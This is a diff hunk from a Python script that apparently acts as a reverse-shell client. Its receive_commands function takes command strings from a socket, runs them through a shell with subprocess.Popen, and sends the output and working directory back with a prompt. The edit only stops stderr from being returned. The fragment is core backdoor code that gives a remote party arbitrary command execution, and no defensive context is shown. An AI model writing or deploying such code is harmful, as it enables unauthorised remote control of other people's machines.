@@ -43,7 +43,7 @@ def receive_commands():
             try:
                 cmd = subprocess.Popen(data[:].decode(
                     "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                output_byte = cmd.stdout.read() + cmd.stderr.read()
+                output_byte = cmd.stdout.read()
                 output_str = str(output_byte, "utf-8")
                 s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                 print(output_str)
